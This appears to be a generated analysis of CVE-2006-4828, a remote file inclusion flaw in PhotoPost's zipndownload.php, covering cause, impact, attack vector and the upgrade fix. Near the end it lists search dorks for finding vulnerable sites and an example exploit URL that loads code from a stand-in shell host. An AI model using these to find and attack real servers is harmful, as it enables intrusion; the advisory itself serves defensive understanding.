Based on the provided content, here's the breakdown of CVE-2006-4828:

**Root Cause of Vulnerability:**

*   The vulnerability stems from a Remote File Inclusion (RFI) flaw in the `zipndownload.php` script of PhotoPost versions 4.6 and earlier.
*   The script uses `require` statements to include files based on the `PP_PATH` parameter:
    *   `require "$PP_PATH/languages/$pplang/showgallery.php";`
    *   `require "$PP_PATH/login-inc.php";`

**Weaknesses/Vulnerabilities Present:**

*   **Remote File Inclusion (RFI):** The `PP_PATH` parameter is not properly sanitized, allowing an attacker to inject a URL pointing to a malicious file. This allows arbitrary code execution by including remote files.

**Impact of Exploitation:**

*   **Arbitrary Code Execution:** By injecting a malicious PHP file, an attacker can execute arbitrary code on the server.
*   **Full System Compromise:** Depending on the server configuration and the nature of the included file, the attacker can potentially gain full control of the affected server.
*   **Confidentiality, Integrity, and Availability Impact:** The vulnerability allows partial impact in all three dimensions, according to the provided CVSS score.

**Attack Vectors:**

*   **HTTP Request:** The attacker sends a specially crafted HTTP request to the vulnerable `zipndownload.php` script.
*   **`PP_PATH` Parameter:** The attacker injects a malicious URL into the `PP_PATH` parameter.

**Required Attacker Capabilities/Position:**

*   **Remote Network Access:** The attacker only needs remote access to the vulnerable server.
*   **No Authentication:** No authentication is required to exploit the vulnerability.
*   **Knowledge of Vulnerable Script:** The attacker needs to know the location of the `zipndownload.php` script and the vulnerable parameter `PP_PATH`.

**Additional Information from the Content:**

*   **Vulnerable Versions:** PhotoPost versions 4.6, 4.5 and likely older versions 4.x are vulnerable.
*   **Fix:** The vulnerability can be fixed by upgrading to PhotoPost 4.7 or 4.8.
*   **Dork:** The provided dorks can be used to identify vulnerable websites: `"Powered by: PhotoPost PHP 4.6"` or `"Powered by: PhotoPost PHP 4.5"`.
*   **Exploit Example:** `http://site.com/[path]/zipndownload.php?PP_PATH=http://SHELLURL.COM?` shows an example where `SHELLURL.COM` hosts the malicious file.
*   **Credit:**  The exploit was discovered by "Saudi Hackrz".
